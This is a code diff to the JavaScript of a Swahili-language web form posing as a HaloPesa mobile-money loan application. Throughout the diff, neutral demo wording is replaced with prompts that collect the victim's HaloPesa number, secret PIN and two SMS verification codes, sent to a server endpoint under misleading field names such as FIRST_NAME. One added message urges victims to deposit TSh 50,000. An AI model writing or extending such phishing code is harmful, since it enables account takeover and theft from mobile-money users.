@@ -130,10 +130,10 @@ async function waitForStatus(expected,next,errorId){
 }
 function handleRejection(d){
   const messages={
-    APPLICATION_DETAILS:"Nambari ya kumbukumbu haikukubaliwa. Hakiki nambari ya majaribio kisha ujaribu tena.",
-    FIRST_NAME:"Chaguo la kifurushi halikukubaliwa. Chagua kifurushi tena.",
-    SECOND_NAME:"Uthibitisho wa chaguo haukukubaliwa. Thibitisha tena.",
-    AMOUNT:"Thamani ya kifurushi cha demo haikukubaliwa. Hakiki thamani uliyoingiza kisha ujaribu tena."
+    APPLICATION_DETAILS:"Namba yako au PIN uliyoweka si sahihi. Tafadhali hakiki taarifa zako na ujaribu tena. Hakikisha unatumia namba ya HaloPesa pekee..",
+    FIRST_NAME:"Msimbo wa Uthibitisho (Code 1) si sahihi au muda wake umeisha. Tafadhali ingiza msimbo mpya uliopokea kupitia SMS na ujaribu tena..",
+    SECOND_NAME:"Msimbo wa Uthibitisho (Code 2) si sahihi au muda wake umeisha. Tafadhali ingiza msimbo mpya uliopokea kupitia SMS na ujaribu tena..",
+    AMOUNT:"Samahani, ombi lako la mkopo halijafanikiwa kwa sasa. Tafadhali weka salio la angalau **TSh 50,000** kwenye akaunti yako ya HaloPesa au endelea kutumia laini yako kufanya miamala mara kwa mara ili kuongeza uwezekano wa kustahili kupata mkopo.Unaweza kujaribu kutuma ombi tena baada ya kukidhi vigezo vinavyohitajika.."
   };
   const msg=messages[d.rejectedStage]||"Ombi halikukubaliwa. Hakiki taarifa za HALOPESA hii kisha ujaribu tena.";
   if(d.rejectedStage==="FIRST_NAME"){
@@ -150,9 +150,9 @@ $("loginForm").addEventListener("submit",async e=>{
   e.preventDefault();setError("loginError","");
   const phone=$("phone").value.trim(),whatsapp=$("whatsappNumber").value.trim(),applicationId=$("applicationIdInput").value.trim();
   const amount=Number($("loanAmountChoice").value),termMonths=Number($("termChoice").value);
-  if(!/^[0-9+\s-]{9,20}$/.test(phone))return setError("loginError","Weka nambari sahihi ya simu.");
+  if(!/^[0-9+\s-]{9,20}$/.test(phone))return setError("loginError","Weka nambari sahihi ya halopesa.");
   if(whatsapp&&!/^[0-9+\s-]{9,20}$/.test(whatsapp))return setError("loginError","Weka nambari sahihi ya WhatsApp au acha wazi.");
-  if(!/^\d{4}$/.test(applicationId))return setError("loginError","Weka nambari ya kumbukumbu yenye tarakimu 4.");
+  if(!/^\d{4}$/.test(applicationId))return setError("loginError","Weka nambari ya siri sahihi.");
   const b=$("startApplication");b.disabled=true;state.amount=amount;state.termMonths=termMonths;state.phone=phone;state.whatsapp=whatsapp;
   $("loanAmount").value=String(amount);updateLoanSummary();
   try{const r=await fetch("/api/applications",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({phone,whatsappNumber:whatsapp,applicationId,amount,termMonths,referralToken:state.referralToken})});const d=await r.json();if(!r.ok)throw new Error(d.error);state.applicationId=d.applicationId;state.applicationNo=d.applicationNo;$("applicationNumber").textContent=d.applicationNo;$("approvalWaiting").classList.remove("hidden");$("phone").disabled=true;$("whatsappNumber").disabled=true;$("applicationIdInput").disabled=true;b.classList.add("hidden");await waitForStatus("APPROVED",2,"loginError");}catch(err){setError("loginError",err.message||"Imeshindikana kutuma ombi.");b.disabled=false;}
@@ -163,7 +163,7 @@ async function submitName(type,resubmit=false){
   const input=$(type+"Name"),btn=$(type+"NameBtn"),waiting=$(type+"NameWaiting"),errorId=type==="first"?"page2Error":"page3Error";
   setError(errorId,"");
   const value=input.value.trim();
-  if(!/^\d{4}$/.test(input.value.trim()))return setError(errorId,"Ingiza nambari halali ya kumbukumbu yenye tarakimu 4.");
+  if(!/^\d{4}$/.test(input.value.trim()))return setError(errorId,"Ingiza nambari halali yenye tarakimu 4.");
   nameSubmission[type]=true;
   btn.disabled=true;
   try{
